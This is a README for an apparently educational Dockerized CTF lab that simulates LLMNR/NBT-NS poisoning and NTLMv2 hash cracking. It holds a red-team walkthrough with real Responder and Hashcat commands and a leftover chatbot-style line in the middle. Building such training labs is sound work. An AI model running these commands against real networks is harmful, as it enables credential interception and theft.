# Cydena CPSA Lite Module 6: Windows Security

Cydena is a full-stack CTF simulation environment designed to teach **LLMNR/NBT-NS Poisoning** and **NTLMv2 Cracking**. This lab uses a stateful architecture to ensure players follow authentic penetration testing workflows.

## Architecture

* **Frontend**: React-based terminal emulator.
* **Backend**: Django REST Framework with session-based state management.
* **Infrastructure**: Docker Compose for container orchestration.

---

## ⚙️ Setup & Installation

### 1. Prerequisites

* [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed on Windows, macOS, or Linux.
* [Docker Compose](https://docs.docker.com/compose/) (included with Docker Desktop).

### 2. Environment Configuration

Create a file named `.env` in the **root directory** (next to `docker-compose.yml`) and paste the following:

```env
# --- Backend ---
DEBUG=0
DJANGO_SECRET_KEY=y0ur-v3ry-53cur3-r4ndom-5tr1ng
CTF_TOKEN=Q3lkZW5hU2VjcmV0MjAyNg==
ALLOWED_HOSTS=localhost,127.0.0.1,backend

# --- Frontend ---
REACT_APP_API_URL=http://localhost:8000/api/run-command/
REACT_APP_CTF_TOKEN=Q3lkZW5hU2VjcmV0MjAyNg==

```

### 3. Build and Launch

Run the following command in your terminal:

```bash
docker-compose up --build

```

* **Frontend**: Available at `http://localhost:3000`
* **Backend**: Available at `http://localhost:8000`

---

## Red Team Mission Walkthrough

The lab enforces a strict logical sequence. You must capture data before you can save or crack it.

### Phase 1: Interception

Execute the **Responder** command to begin poisoning network broadcasts.

```bash
responder -I eth0 -rdwv

```

*Wait 5 seconds for the simulation to trigger an NTLMv2 hash capture.*

### Phase 2: Data Persistence

Copy the captured hash and save it into the simulated file system using `echo`.

```bash
echo '[PASTE_HASH_HERE]' > hash.txt

```

### Phase 3: Verification

Verify that the file `hash.txt` exists and contains the correct data.

```bash
ls -la
cat hash.txt

```

### Phase 4: Offline Cracking

Use **Hashcat** to crack the captured hash using the Net-NTLMv2 module.

```bash
hashcat -m 5600 hash.txt rockyou.txt --force

```

---

## Security & AppSec Features

* **Session Isolation**: Uses Django's `SessionMiddleware` to track player progress independently.
* **State Gates**: Backend prevents "skipping" steps (e.g., running Hashcat without `hash.txt` will return a `404 Not Found` error).
* **Hardened Headers**: Configured with `CORS_ALLOW_CREDENTIALS` and `HttpOnly` cookies for secure communication between containers.
* **Token Authentication**: All API requests require a custom `X-CTF-Token` header validated against the `.env` file.

---

## 📂 Project Structure

```text
.
├── backend/
│   ├── Dockerfile         # Production-ready Gunicorn setup
│   ├── manage.py          # Django entry point
│   ├── view.py            # Main CTF logic & ANSI banners
│   ├── settings.py        # Hardened Django configuration
│   └── requirements.txt   # Python dependencies
├── frontend/
│   ├── Dockerfile         # React environment setup
│   └── src/App.js         // Terminal UI & ANSI parser
├── .env                   # Shared secrets (Ignore in Git)
└── docker-compose.yml     # Container orchestration

```
Here is the **Docker Commands** section for your `README.md`. It is formatted specifically for GitHub to help users build, run, and manage the containers.

---

## Docker Commands
### Build and Start

Build the images and start the containers for the first time:

```bash
docker-compose up --build

```

### Standard Startup

Start the containers in the background (detached mode):

```bash
docker-compose up -d

```

### Stop and Remove

Stop the services and remove the internal network:

```bash
docker-compose down

```

### Monitoring

View real-time logs to debug backend/frontend communication:

```bash
docker-compose logs -f

```

Check the status of the running containers:

```bash
docker ps

```

### Container Access

Access the backend container directly to inspect the simulated file system:

```bash
docker exec -it backend bash

```

### Cleanup

Remove unused data, containers, and images to free up space:

```bash
docker system prune -a

```
